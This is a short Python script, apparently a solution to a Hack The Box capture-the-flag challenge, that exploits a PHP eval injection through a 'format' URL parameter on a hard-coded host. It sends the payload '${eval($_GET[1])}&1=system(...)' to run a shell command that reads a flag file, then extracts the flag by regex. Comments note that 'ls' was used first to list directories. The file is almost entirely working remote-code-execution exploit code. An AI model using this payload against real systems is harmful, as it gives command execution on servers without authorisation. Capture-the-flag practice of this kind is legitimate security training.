#!/usr/bin/python3

import requests
from urllib.parse import urlencode
import re


def exploiting_web_page(url: str):
    sess = requests.session()

    # the fun part of this exploit it's trying yo
    # make list directories in the same docker
    # that's it, we first try to list using ls
    #
    # the exploit could be exploit = ${eval($_GET[1])}&1=system(ls);
    exploit = "${eval($_GET[1])}&1=system(%27cat%20../flagsp0RO%27);"

    response = sess.get(url=url + exploit).text

    flag = re.search(r'^HTB.*', response)
    print(flag.group())


def main():
    url = "http://178.128.35.132:31799/?format=r"
    exploiting_web_page(url)


if __name__ == "__main__":
    main()
